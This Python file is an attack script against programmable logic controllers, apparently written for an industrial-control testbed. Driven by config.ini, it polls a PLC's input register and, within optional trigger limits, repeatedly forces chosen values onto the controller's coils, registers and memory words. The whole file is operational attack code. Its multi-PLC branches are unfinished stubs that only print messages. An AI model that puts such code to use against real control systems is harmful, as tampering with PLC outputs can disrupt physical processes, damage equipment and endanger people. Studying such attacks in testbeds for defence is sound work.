#!/usr/bin/env python3

import configparser

def attack(ctx):  

    def on_level_change_plc1(value: int):

        # Read from config.ini
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        pckt_number = config.get('params', 'packets_number')
        pckt_value = int(config.get('params', 'packets_value'))

        if(pckt_number == "loop"): 
            while(True):
                case = 0
                print('PLC 1 level value', value)
                if checkTrigger():
                    # Trigger checked
                    
                    if(config.get('params', 'coil1_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil1_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                    elif(case == 1): # Only sup limit
                        if(value > int(config.get('params', 'coil1_sup_limit'))):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")
                            value +=1

                    elif(case == 2): # Only inf limit
                        if(value < int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")
                            value -=1

                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil1_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
                                value +=1


                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc1(pckt_value)

        else:
            # Pckt number != loop
            ct = 0
            n = int(pckt_number)
            while(ct < n):
                case = 0
                print('PLC 1 level value', value)
                if checkTrigger():
                    # Trigger checked
                    
                    if(config.get('params', 'coil1_sup_limit') != ""):
                        case += 1
                    if(config.get('params', 'coil1_inf_limit') !=""):
                        case += 2

                    if(case == 0): # No limits
                        print("No limits!")   
                    elif(case == 1): # Only sup limit
                        if(value > int(config.get('params', 'coil1_sup_limit'))):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")
                            value +=1

                    elif(case == 2): # Only inf limit
                        if(value < int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")
                            value -=1

                    elif(case == 3): # Both limits
                        if(value < int(config.get('params', 'coil1_sup_limit')) and value > int(config.get('params', 'coil1_inf_limit'))):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")
                            if(value > int(config.get('params', 'coil1_sup_limit'))):
                                value -= 1
                            elif(value < int(config.get('params', 'coil1_inf_limit'))):
                                value +=1


                else:
                    # Trigger unchecked - only main conditions
                    trigger_operation_plc1(pckt_value)
                ct = ct + 1
        
        

        
    

    def checkTrigger():
        
        config = configparser.ConfigParser()
        config.read('config.ini')
        
        # Allocate trigger params (if present)
        coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
        coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
        coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
        coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
        coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
        coil_3_inf_limit = config.get('params', 'coil3_inf_limit')

        if(coil_1_sup_limit == "" and coil_1_inf_limit == "" and coil_2_sup_limit == "" and coil_2_inf_limit == ""
            and coil_3_sup_limit =="" and coil_3_inf_limit == ""):
            return False # No triggers

        return True
    
    
    
    def trigger_operation_plc1(p_val):
        
        config = configparser.ConfigParser()
        config.read('config.ini')

        # Extracting choices coils/registers
        plc1_choice = config.get('params', 'plc1_choice')
        choices_list = [choice.strip() for choice in plc1_choice.split(',')]
        
        plc_1_coil_0_0 = ""
        plc_1_coil_0_1 = ""
        plc_1_coil_0_2 = ""
        
        plc_1_reg_0_0 = ""
        plc_1_reg_0_1 = ""
        plc_1_reg_0_3 = ""
        plc_1_reg_0_4 = ""
        
        plc_1_dreg_0_0 = ""
        plc_1_dreg_0_1 = ""
        
        #Vanno solo le coil
        
        for choice in choices_list:
            if choice.startswith('c'):
                if choice.endswith('1'):
                    plc_1_coil_0_0 = ctx.register('plc1', 'C', 0)
                elif choice.endswith('2'):
                    plc_1_coil_0_1 = ctx.register('plc1', 'C', 1)
                elif choice.endswith('3'):
                    plc_1_coil_0_2 = ctx.register('plc1', 'C', 2)
            elif choice.startswith('r'):
                if choice.endswith('1'):
                    plc_1_reg_0_0 = ctx.register('plc1', 'H', 0)
                elif choice.endswith('2'):
                    plc_1_reg_0_1 = ctx.register('plc1', 'H', 1)
                elif choice.endswith('3'):
                    plc_1_reg_0_3 = ctx.register('plc1', 'H', 3)
                elif choice.endswith('4'):
                    plc_1_reg_0_4 = ctx.register('plc1', 'H', 4)
            elif choice.startswith('m'):
                if choice.endswith('1'):
                    plc_1_dreg_0_0 = ctx.register('plc1', 'D', 0)
                elif choice.endswith('2'):
                    plc_1_dreg_0_1 = ctx.register('plc1', 'D', 1)
        

        if  plc_1_coil_0_0 != "":
            plc_1_coil_0_0.write(int(p_val))
            print ("Writing on %QX0.0 - PLC 1 ")
        if  plc_1_coil_0_1 != "":
            plc_1_coil_0_1.write(int(p_val))
            print ("Writing on %QX0.1 - PLC 1 ")
        if  plc_1_coil_0_2 != "":
            plc_1_coil_0_2.write(int(p_val))
            print ("Writing on %QX0.2 - PLC 1 ")
        
        if  plc_1_reg_0_0 != "":
            plc_1_reg_0_0.write(int(p_val))
            print ("Writing on %MX0.0 - PLC 1 ")
        if  plc_1_reg_0_1 != "":
            plc_1_reg_0_1.write(int(p_val))
            print ("Writing on %MX0.1 - PLC 1 ")
        if  plc_1_reg_0_3 != "":
            plc_1_reg_0_3.write(int(p_val))
            print ("Writing on %MX0.3 - PLC 1 ")
        if  plc_1_reg_0_4 != "":
            plc_1_reg_0_4.write(int(p_val))
            print ("Writing on %MX0.4 - PLC 1 ")
        
        if  plc_1_dreg_0_0 != "":
            plc_1_dreg_0_0.write(int(p_val))
            print ("Writing on %MW0 - PLC 1 ")
        if  plc_1_dreg_0_1 != "":
            plc_1_dreg_0_1.write(int(p_val))
            print ("Writing on %MW1 - PLC 1 ")            
        
        if p_val == 0:
            print('COMMAND OFF - Value wrote:', p_val)
        elif p_val == 1:
            print('COMMAND ON - Value wrote:', p_val)

    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    # Allocate all IW registers
    plc_1_input_register = ctx.register('plc1', 'I', 0)
    plc_2_input_register = ctx.register('plc2', 'I', 0)
    plc_3_input_register = ctx.register('plc3', 'I', 0)
       
    # PLC attack
    # ONE PLC selected
    if config.get('params', 'plc1_choice') != "" and config.get('params', 'plc2_choice')== "" and config.get('params', 'plc3_choice') == "":
        print("Attacking one plc...")
        plc_1_input_register.start_polling(500, on_level_change_plc1)

    # TWO PLCs selected
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') == "":
        print("Attacking two plcs...")

    # THREE PLCs selected 
    if config.get('plc', 'plc1') != "" and config.get('params', 'plc2_choice') != "" and config.get('params', 'plc3_choice') != "":
        print("Attacking three plcs...")



